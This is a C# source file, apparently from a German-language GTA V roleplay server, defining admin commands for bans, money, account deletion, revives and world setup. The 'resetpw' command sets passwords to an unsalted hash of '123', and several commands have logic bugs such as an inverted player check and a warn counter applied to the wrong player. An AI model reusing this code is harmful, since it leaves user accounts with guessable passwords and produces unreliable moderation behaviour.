                MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Id = @username LIMIT 1");
                mySqlQuery.AddParameter("@username", Convert.ToInt32(name));
                MySqlResult mySqlResult = MySqlHandler.GetQuery(mySqlQuery);
                MySqlDataReader reader = mySqlResult.Reader;
                try
                {
                    if (reader.HasRows)
                    {
                        reader.Read();
                        dbPlayer.SendNotification("Der Spielername lautet:" + reader.GetString("Username"), "black", 3500);
                    }
                    else
                    {
                        dbPlayer.SendNotification("Spieler wurde nicht gefunden!", "black", 3500);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                finally
                {
                    await reader.DisposeAsync();
                    await mySqlResult.Connection.DisposeAsync();
                }
            }, "infonumber", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                string daysold = args[2];
                if (daysold == null) return;

                if (int.TryParse(daysold, out var days))
                {
                    if (dbPlayer2 == null) return;
                    Adminrank adminrank = dbPlayer.Adminrank;
                    if (adminrank == null) return;
                    Adminrank adminranks = dbPlayer2.Adminrank;
                    if (adminranks == null) return;

                    if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                        if (adminrank.Permission <= adminranks.Permission)
                        {
                            dbPlayer.SendNotification("Das kannst du nicht tun, da der Teamler mehr Rechte als du hat oder die gleichen!", "black", 3500);
                            return;
                        }
                        else
                        {
                            BanExternal.TimeBanPlayer(dbPlayer2, days, dbPlayer.Name);
                            dbPlayer.SendNotification("Spieler gebannt!", "black", 3500);
                        }
                }
            }, "timeban", 94, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];//

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.RemoveAllWeapons();
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast von " + name + " das Waffenrad gecleart.", "black", 3500);
                    dbPlayer2.SendNotification("Dein Waffenrad wurde gecleart! ", "black", 3500);
                }
            }, "clearload", 96, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast den Char von  " + name + " neugeladen!", "black", 3500);
                    dbPlayer.RefreshData(dbPlayer);
                    dbPlayer2.SpawnPlayer(dbPlayer.Client.Position);
                    dbPlayer2.disableAllPlayerActions(false);
                    dbPlayer2.SetAttribute("Death", 0);
                    dbPlayer2.StopAnimation();
                    dbPlayer2.SetInvincible(false);
                    dbPlayer2.DeathData = new DeathData
                    {
                        IsDead = false,
                        DeathTime = new DateTime(0)
                    };
                    dbPlayer2.TriggerEvent("toggleBlurred", false);
                    dbPlayer2.SendNotification("Dein Char wurde neugeladen! ", "black", 3500);
                }
            }, "reloadchar", 98, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string str = args[1];
                if (str != "reset")
                {
                    dbPlayer.Name = str;
                    dbPlayer.RefreshData(dbPlayer);
                    dbPlayer.Client.Name = (dbPlayer.Name);
                    dbPlayer.SendNotification("Fakename gesetzt! (" + str + ")", "black", 3500);
                }
                else
                {
                    string altername = dbPlayer.GetAttributeString("Username");
                    dbPlayer.GetAttributeString("Username");
                    dbPlayer.Client.Name = (altername);
                    dbPlayer.RefreshData(dbPlayer);
                    dbPlayer.SendNotification("Fakename zurückgesetzt! (" + altername + ")", "black", 3500);
                }
            }, "fakename", 100, 1));

            commandList.Add(new Command((client, dbPlayer, args) =>
            {
                string name = args[1];

                if (client.HasData("OLD_CHAR"))
                {
                    //dbPlayer.RefreshData(client.GetData<DbPlayer>("OLD_CHAR"));
                    dbPlayer.SendNotification("Du hast nun deinen alten Char", "black", 3500);
                    dbPlayer.ResetData("OLD_CHAR");
                }

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Du hast nun den Char von " + name, "black", 3500);
                    dbPlayer.Client.SetData("OLD_CHAR", dbPlayer);
                    dbPlayer.RefreshData(dbPlayer2);
                }
            }, "troll", 99, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string Id = args[1];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(Id);

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    MySqlQuery mySqlQuery = new MySqlQuery("DELETE FROM inventorys WHERE Id = @id");
                    mySqlQuery.AddParameter("@id", Id);
                    MySqlHandler.ExecuteSync(mySqlQuery);
                    dbPlayer2.RefreshData(dbPlayer2);

                    dbPlayer.SendNotification("Du hast dem Spieler " + Id + " das Inventar zurückgesetzt!", "black", 3500);
                    dbPlayer2.SendNotification("Dein Inventar wurde zurückgesetzt!! ", "black", 3500);
                }
            }, "clearinv", 98, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {

                string reason = args[2];

                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.SetAttribute("warns", (int)dbPlayer.GetAttributeInt("warns") + 1);
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast den Spieler " + target.Name + " verwarnt!", "black", 3500);
                    dbPlayer2.SendNotification("Du wurdest von " + dbPlayer.Name + "verwarnt! Grund: " + reason + "", "black", 3500);
                }
            }, "warn", 91, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    Client client = dbPlayer2.Client;
                    Adminrank adminrank = dbPlayer.Adminrank;

                    dbPlayer.RefreshData(dbPlayer);
                    dbPlayer.SendNotification("Warns von " + target.Name + ": " + dbPlayer2.warns + "", "black", 3500);
                    dbPlayer.SendNotification("Social Name von " + target.Name + ": " + client.SocialClubName + "", "black", 3500);
                    dbPlayer.SendNotification("Fraktion von " + target.Name + ": " + dbPlayer2.Faction.Name + "", "black", 3500);
                    dbPlayer.SendNotification("Fraktion - Rang von " + target.Name + ": " + dbPlayer2.Factionrank + "", "black", 3500);
                    dbPlayer.SendNotification("Business von " + target.Name + ": " + dbPlayer2.Business.Name + "", "black", 3500);
                    dbPlayer.SendNotification("Geld von " + target.Name + ": " + dbPlayer2.Money + "", "black", 3500);
                    dbPlayer.SendNotification("Level von " + target.Name + ": " + dbPlayer2.Level + "", "black", 3500);
                    dbPlayer.SendNotification("ID von " + target.Name + ": " + dbPlayer2.Id + "", "black", 3500);
                    dbPlayer.SendNotification("Online seit: " + dbPlayer2.OnlineSince + "", "black", 3500);

                }
            }, "info", 91, 1));





            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string price = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.addMoney(Convert.ToInt32(price));
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast " + name + " Geld gegeben! (" + price + ")", "black", 3500);
                    dbPlayer2.SendNotification("Dir wurde von " + dbPlayer.Name + " Geld gegeben (" + price + ")", "black", 3500);
                }
            }, "addmoney", 97, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            //  NAPI.Pools.GetAllPlayers().ForEach(player => player.Client.addMoney(Convert.ToInt32(price)));
            //NAPI.Pools.GetAllPlayers().ForEach((Client client) =>
            {
                string price = args[1];
                dbPlayer.SendNotification("Du hast allen Spielern " + price + "$ gegeben! (" + NAPI.Pools.GetAllPlayers().Count + ")", "black", 3500);
                foreach (Client target in NAPI.Pools.GetAllPlayers())
                {
                    if (target == null || target.Exists) continue;
                    DbPlayer dbPlayer2 = target.GetPlayer(); dbPlayer2.addMoney(Convert.ToInt32(price));
                    dbPlayer2.SendNotification("Von " + dbPlayer.Name + " +" + price + "$", "black", 3500);




                }
            }, "eventmoney", 100, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string price = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.removeMoney(Convert.ToInt32(price));
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast " + name + " Geld entfernt! (" + price + ")", "black", 3500);
                    dbPlayer2.SendNotification("Dir wurde von " + dbPlayer.Name + " Geld entfernt (" + price + ")", "black", 3500);
                }
            }, "removemoney", 98, 2));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string level = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {

                    Client client = dbPlayer2.Client;
                    dbPlayer2.SetAttribute("Level", level);
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer.SendNotification("Du hast dem Spieler " + name + " das Level " + level + " gesetzt.", "black", 3500);
                    dbPlayer2.SendNotification("Dein Level wurde auf " + level + " gesetzt!", "black", 3500);
                }
            }, "changelevel", 97, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                string nachricht = args[2];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    Client client = dbPlayer2.Client;
                    dbPlayer2.SendNotification(String.Join(" ", args).Replace("apn " + name, ""), "#0972c1", 10000, "ADMIN-PN - (" + dbPlayer.Name + ")");
                    dbPlayer.SendNotification("Privat Nachricht an " + name + " gesendet!", "black", 3500);

                }
            }, "apn", 91, 2));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery("DELETE FROM bans WHERE Account = @username");
                mySqlQuery.AddParameter("@username", name);
                MySqlHandler.ExecuteSync(mySqlQuery);
                BanModule.bans.RemoveAll(ban => ban.Account == name);
                BanModule.TimeBanIdentifier(DateTime.Now, name);
                dbPlayer.SendNotification("Spieler entbannt!", "black", 3500);
                WebhookSender.SendMessage("Spieler wurde entbannt", "Der Spieler " + dbPlayer.Name + " hat den Spieler " + name + " revived.", Webhooks.revivelogs, "Unban");
            }, "unban", 95, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery("DELETE FROM accounts WHERE Username = @username");
                mySqlQuery.AddParameter("@username", name);
                MySqlHandler.ExecuteSync(mySqlQuery);

                dbPlayer.SendNotification("Account gelöscht!", "black", 3500);
            }, "delacc", 97, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string ort = args[1];
                if (ort == "Haus" || ort == "Krankenhaus" || ort == "Fraktion")
                {
                    if (ort == "Haus")
                    {
                        House house = HouseModule.houses.FirstOrDefault((House house2) => house2.OwnerId == dbPlayer.Id);
                        if (house == null)
                        {
                            dbPlayer.SendNotification("Du Besitzt kein Haus!", "black", 3500);
                            return;
                        }
                        MySqlQuery mySqlQuery = new MySqlQuery("UPDATE accounts SET Spawn = 2 WHERE Username = @username");
                        mySqlQuery.AddParameter("@username", dbPlayer.Name);
                        MySqlHandler.ExecuteSync(mySqlQuery);
                        dbPlayer.SendNotification("Du spawnst nun an deinem Haus", "black", 3500);
                    }
                    else if (ort == "Krankenhaus")
                    {
                        MySqlQuery mySqlQuery = new MySqlQuery("UPDATE accounts SET Spawn = 0 WHERE Username = @username");
                        mySqlQuery.AddParameter("@username", dbPlayer.Name);
                        MySqlHandler.ExecuteSync(mySqlQuery);
                        dbPlayer.SendNotification("Du spawnst nun im Krankenhaus", "black", 3500);
                    }
                    else if (ort == "Fraktion")
                    {
                        if (dbPlayer.Faction.Name == "Zivilist")
                        {
                            dbPlayer.SendNotification("Du bist in keiner Fraktion!", "black", 3500);
                            return;
                        }
                        MySqlQuery mySqlQuery = new MySqlQuery("UPDATE accounts SET Spawn = 1 WHERE Username = @username");
                        mySqlQuery.AddParameter("@username", dbPlayer.Name);
                        MySqlHandler.ExecuteSync(mySqlQuery);
                        dbPlayer.SendNotification("Du spawnst nun an deiner Fraktion", "black", 3500);
                    }
                }
                else
                {
                    dbPlayer.SendNotification("Dieser Spawn ist nicht Gültig! (Haus, Fraktion, Krankenhaus)", "black", 3500);
                    return;
                }


            }, "spawnchange", 0, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery("DELETE FROM accounts WHERE Social = @social");
                mySqlQuery.AddParameter("@social", name);
                MySqlHandler.ExecuteSync(mySqlQuery);

                dbPlayer.SendNotification("Account durch Socialclub-Namen gelöscht!", "black", 3500);
            }, "delsacc", 97, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string frakid = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery("DELETE FROM fraktionen WHERE Id = @id");
                mySqlQuery.AddParameter("@id", frakid);
                MySqlHandler.ExecuteSync(mySqlQuery);

                dbPlayer.SendNotification("Fraktion gelöscht!", "black", 3500);
            }, "delfrak", 99, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {

                NAPI.World.SetWeather(Weather.EXTRASUNNY);
                foreach (Client client in NAPI.Pools.GetAllPlayers())
                {
                    DbPlayer dbtarget = client.GetPlayer();

                    dbtarget.ResetData("SNOWWEATHER");
                }

                dbPlayer.SendNotification("Wetter gecleert!", "black", 3500);
            }, "clearweather", 92, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery("UPDATE accounts SET Password = @password WHERE Username = @username");
                mySqlQuery.AddParameter("@password", "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3");
                mySqlQuery.AddParameter("@username", name);
                MySqlHandler.ExecuteSync(mySqlQuery);



                dbPlayer.SendNotification("Passwort geändert! (123)", "black", 3500);
            }, "resetpw", 95, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];
                int slot = 0;
                bool slot2 = int.TryParse(args[2], out slot);
                int drawable = 0;
                bool drawable2 = int.TryParse(args[3], out drawable);
                int texture = 0;
                bool texture2 = int.TryParse(args[4], out texture);

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);

                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    dbPlayer2.RefreshData(dbPlayer2);
                    dbPlayer2.SetClothes(slot, drawable, texture);
                    dbPlayer.SendNotification("Kleidungsstück geändert zu " + slot + " " + drawable + " " + texture + " ", "black", 3500);
                }
            }, "aclothes", 92, 4));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string collection = args[1];
                string overlay = args[2];
                Client p;
                Decoration data = new Decoration();
                data.Collection = NAPI.Util.GetHashKey(collection);//"mpchristmas2_overlays"
                data.Overlay = NAPI.Util.GetHashKey(overlay);//"MP_Xmas2_M_Tat_005"
                dbPlayer.SendNotification("" + data, "black", 3500);
                dbPlayer.Client.SetDecoration(data);
            }, "atattoos", 92, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string hash = args[1];
                string hash2 = args[2];
                Client p;
                dbPlayer.SendNotification("1: " + NAPI.Util.GetHashKey(hash), "black", 3500);
                dbPlayer.SendNotification("2: " + NAPI.Util.GetHashKey(hash2), "black", 3500);
            }, "tattoo", 92, 2));






            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                MySqlQuery mySqlQuery = new MySqlQuery("UPDATE vehicles SET Parked = 1 WHERE OwnerId = @username");
                mySqlQuery.AddParameter("@username", name);
                MySqlHandler.ExecuteSync(mySqlQuery);

                dbPlayer.SendNotification("Du hast alle Fahrzeuge von " + name + " eingeparkt!", "black", 3500);
            }, "parkcars", 95, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (int.TryParse(args[1], out var result))
                {
                    if (dbPlayer.OwnVehicles.ContainsKey(result))
                    {
                        VehicleKeyHandler.Instance.DeleteAllVehicleKeys(result);
                        dbPlayer.SendNotification("Schlüssel von dem Fahrzeug wurden gecleart.", "black", 3500);
                    }
                    else
                    {
                        dbPlayer.SendNotification("Fahrzeug nicht in deinem Besitz.", "black", 3500);
                    }
                }

            }, "clearvehiclekeys", 0, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer.GetHouse() != null && dbPlayer.GetHouse().OwnerId == dbPlayer.Id)
                {
                    HouseKeyHandler.Instance.DeleteAllHouseKeys(dbPlayer.GetHouse());
                    dbPlayer.SendNotification("Schlüssel von dem Haus wurden gecleart.", "black", 3500);
                }
                else
                {
                    dbPlayer.SendNotification("Haus nicht in deinem Besitz.", "black", 3500, "FEHLER!");
                }

            }, "clearhousekeys", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer.Client.IsInVehicle)
                {
                    dbPlayer.Client.Vehicle.Repair();
                }
            }, "repair", 94, 0));

            // dbPlayer.PlayAnimation(2, "mp_arresting", "b_uncuff");
            //  dbPlayer2.PlayAnimation(2, "mp_arrest_pai#0972c1", "crook_p2_back_right");
            commandList.Add(new Command((dbPlayer, args) =>
            {
                BanModule.Instance.Load(true);

                dbPlayer.SendNotification("Bans neu geladen!", "black", 3500);
            }, "reloadbans", 94, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();

                if (args[1] == "me")
                {
                    dbPlayer.SpawnPlayer(dbPlayer.Client.Position);
                    dbPlayer.disableAllPlayerActions(false);
                    dbPlayer.SetAttribute("Death", 0);
                    dbPlayer.StopAnimation();
                    dbPlayer.SetInvincible(false);
                    dbPlayer.DeathData = new DeathData
                    {
                        IsDead = false,
                        DeathTime = new DateTime(0)
                    };
                    dbPlayer.TriggerEvent("toggleBlurred", false);

                    dbPlayer.SendNotification("Du hast dich selber revived!", "black", 3500);
                    WebhookSender.SendMessage("Spieler wird revived", "Der Spieler " + dbPlayer.Name + " hat sich selber revived.", Webhooks.revivelogs, "Revive");
                    return;
                }

                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                    return;

                Client client = dbPlayer2.Client;


                dbPlayer2.SpawnPlayer(dbPlayer2.Client.Position);
                dbPlayer2.disableAllPlayerActions(false);
                dbPlayer2.SetAttribute("Death", 0);
                dbPlayer2.StopAnimation();
                dbPlayer2.SetInvincible(false);
                dbPlayer2.DeathData = new DeathData
                {
                    IsDead = false,
                    DeathTime = new DateTime(0)
                };
                dbPlayer2.TriggerEvent("toggleBlurred", false);

                dbPlayer.SendNotification("Du hast " + dbPlayer2.Name + " revived!", "black", 3500);
                dbPlayer2.SendNotification("Du wurdest von " + dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " revived!", "black", 3500);
                WebhookSender.SendMessage("Spieler wird revived", "Der Spieler " + dbPlayer.Name + " hat den Spieler " + dbPlayer2.Name + " revived.", Webhooks.revivelogs, "Revive");
            }, "revive", 94, 1));

            commandList.Add(new Command((dbPlayer, args) => PaintballModule.leavePaintball(dbPlayer.Client), "quitffa", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer.Client.Dimension == 8888)
                {
                    dbPlayer.Client.Position = dbPlayer.Faction.Storage;
                    dbPlayer.Dimension = 0;
                    dbPlayer.RemoveAllWeapons();
                    WeaponManager.loadWeapons(dbPlayer.Client);
                    dbPlayer.Armor = 0;
                    dbPlayer.Health = 200;
                }
                else
                {
                    dbPlayer.SendNotification("Du bist nicht im Gangwar", "black", 3500);
                } 
            }, "quitgw", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {

                    var random = new Random();
                    int id = random.Next(10000, 99999);
                    int price = 0;
                    bool price2 = int.TryParse(args[1], out price);
                    string entrance = NAPI.Util.ToJson(client.Position);
                    int classid = 0;
                    bool classid2 = int.TryParse(args[2], out classid);

                    if (!classid2) return;

                    MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO houses (Id, Price, Entrance, ClassId) VALUES (@id, @price, @entrance, @classid)");
                    mySqlQuery.AddParameter("@id", id);
                    mySqlQuery.AddParameter("@price", price);
                    mySqlQuery.AddParameter("@entrance", entrance);
                    mySqlQuery.AddParameter("@classid", classid);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("An deiner Position wurde erfolgreich ein Haus gesetzt. ID: " + id, "black", 3500);

                    NAPI.Marker.CreateMarker(1, client.Position, new Vector3(), new Vector3(), 1.0f, new Color(255, 140, 0), false, 0);
                    NAPI.Blip.CreateBlip(40, client.Position, 1f, 0, "Haus " + id, 255, 0.0f, true, 0, 0);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "sethouse", 100, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    Paintball.initializePaintball(dbPlayer);
                    Paintball.updatePaintballScore(dbPlayer, 20, 34);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "teststatshud", 100, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {

                    var random = new Random();
                    int id = random.Next(10000, 99999);

                    int price = 15000;

                    int minprice = 15000;

                    int maxprice = 350000;

                    int pricestep = 5000;

                    int maxmultiple = 3;

                    int radius = 3;

                    string pos_x = NAPI.Util.ToJson(client.Position.X);

                    string pos_y = NAPI.Util.ToJson(client.Position.Y);

                    string pos_z = NAPI.Util.ToJson(client.Position.Z);

                    MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO kasino_devices (id, price, minprice, maxprice, pricestep, maxmultiple, pos_x, pos_y, pos_z, radius) VALUES (@id, @price, @minprice, @maxprice, @pricestep, @maxmultiple, @pos_x, @pos_y, @pos_z, @radius)");
                    mySqlQuery.AddParameter("@id", id);
                    mySqlQuery.AddParameter("@price", price);
                    mySqlQuery.AddParameter("@minprice", minprice);
                    mySqlQuery.AddParameter("@maxprice", maxprice);
                    mySqlQuery.AddParameter("@pricestep", pricestep);
                    mySqlQuery.AddParameter("@maxmultiple", maxmultiple);
                    mySqlQuery.AddParameter("@pos_x", pos_x);
                    mySqlQuery.AddParameter("@pos_y", pos_y);
                    mySqlQuery.AddParameter("@pos_z", pos_z);
                    mySqlQuery.AddParameter("@radius", radius);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("An deiner Position wurde erfolgreich ein Casino Automat gesetzt. ID: " + id, "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "setcasino", 100, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {


                    var random = new Random();
                    int id = random.Next(10000, 99999);

                    string name = args[1];

                    string shortname = args[2];

                    string spawn = NAPI.Util.ToJson(client.Position);

                    int dimension = random.Next(10000, 99999);

                    string blip = args[3];


                    //  string rgbfarbe = args[4];

                    int rgbfarbe = 0;
                    bool rgbfarbe22 = int.TryParse(args[4], out rgbfarbe);
                    int rgbfarbe2 = 0;
                    bool rgbfarbe33 = int.TryParse(args[5], out rgbfarbe2);
                    int rgbfarbe3 = 0;
                    bool rgbfarbe44 = int.TryParse(args[6], out rgbfarbe3);
                    string rgbf = NAPI.Util.ToJson(new Color(rgbfarbe, rgbfarbe2, rgbfarbe3));




                    MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO fraktionen (Id, Name, Short, Spawn, Storage, Dimension, Blip, RGB) VALUES (@id, @name, @short, @spawn, @storage, @dimension, @blip, @rgb)");
                    mySqlQuery.AddParameter("@id", id);
                    mySqlQuery.AddParameter("@name", name);
                    mySqlQuery.AddParameter("@short", shortname);
                    mySqlQuery.AddParameter("@spawn", spawn);
                    mySqlQuery.AddParameter("@storage", spawn);
                    mySqlQuery.AddParameter("@dimension", dimension);
                    mySqlQuery.AddParameter("@blip", blip);
                    mySqlQuery.AddParameter("@rgb", rgbf);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fraktion Erstellt! Fraktions-ID " + id, "black", 3500); ;

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "cfrak", 98, 6));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {


                    var random = new Random();
                    int id = random.Next(10000, 99999);

                    string name = args[1];

                    string hash = args[2];

                    string collection = args[3];

                    string zone = args[4];

                    string price = args[5];







                    MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO assets_tattoo (Id, name, hash_male, hash_female, collection, zone_id, price) VALUES (@id, @name, @hash_male, @hash_female, @collection, @zone_id, @price)");
                    mySqlQuery.AddParameter("@id", id);
                    mySqlQuery.AddParameter("@name", name);
                    mySqlQuery.AddParameter("@hash_male", hash);
                    mySqlQuery.AddParameter("@hash_female", hash);
                    mySqlQuery.AddParameter("@collection", collection);
                    mySqlQuery.AddParameter("@zone_id", zone);
                    mySqlQuery.AddParameter("@price", price);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Tattoo hinzugefügt!", "black", 3500);

                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "addtattoo", 94, 5));

            /* commandList.Add(new Command((dbPlayer, args) =>
             {
                 Client client = dbPlayer.Client;

                 try
                 {


                     var random = new Random();
                     int id = random.Next(10000, 99999);

                     string name = args[1];

                     string shortname = args[2];

                     string spawn = NAPI.Util.ToJson(client.Position);

                     int dimension = random.Next(10000, 99999);

                     string blip = args[3];

                     int rgbfarbe = 0;
                     bool rgbfarbe22 = int.TryParse(args[4], out rgbfarbe);
                     int rgbfarbe2 = 0;
                     bool rgbfarbe33 = int.TryParse(args[5], out rgbfarbe2);
                     int rgbfarbe3 = 0;
                     bool rgbfarbe44 = int.TryParse(args[6], out rgbfarbe3);
                     string rgbf = NAPI.Util.ToJson(new Color(rgbfarbe, rgbfarbe2, rgbfarbe3));


                     MySqlQuery mySqlQuery = new MySqlQuery("INSERT INTO fraktionen (Id, Name, Short, Spawn, Storage, Dimension, Blip, RGB) VALUES (@id, @name, @short, @spawn, @storage, @dimension, @rgb)");
                     mySqlQuery.AddParameter("@id", id);
                     mySqlQuery.AddParameter("@name", name);
                     mySqlQuery.AddParameter("@short", shortname);
                     mySqlQuery.AddParameter("@spawn", spawn);
                     mySqlQuery.AddParameter("@storage", spawn);
                     mySqlQuery.AddParameter("@dimension", dimension);
                     mySqlQuery.AddParameter("@rgb", rgbf);
                     MySqlHandler.ExecuteSync(mySqlQuery);
                 }
                 catch (Exception ex)
                 {
                     Logger.Print("[EXCEPTION POS] " + ex.Message);
                     Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                 }
             }, "cfrak", 97, 6));*/


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {


                    var random = new Random();
                    int id = random.Next(10000, 99999);

                    string factionid = args[1];

                    string model = args[2];

                    int primary = 0;
                    bool primary2 = int.TryParse(args[3], out primary);

                    int secondary = 0;
                    bool secondary2 = int.TryParse(args[4], out secondary);

                    int headlight = 0;
                    bool headlight2 = int.TryParse(args[5], out headlight);



                    Faction fraktion = FactionModule.getFactionById(Convert.ToInt32(factionid));
